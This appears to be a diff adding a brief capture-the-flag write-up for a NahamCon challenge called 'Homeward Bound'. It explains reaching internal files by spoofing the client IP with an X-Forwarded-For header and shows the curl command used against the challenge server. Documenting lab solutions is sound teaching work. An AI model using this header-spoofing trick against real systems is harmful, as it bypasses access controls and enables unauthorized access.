@@ -1,0 +1,7 @@
+<h2>Homeward Bound</h2>
+
+<p>In this challenge we were supposed to access internal files by spoofing client IP address, this can be done using <code>X-Forwarded-For</code> header</p>
+
+<p><code>
+$ curl -H “X-Forwarded-For: 127.0.0.1” http://challenge.nahamcon.com:31428/
+</code></p>
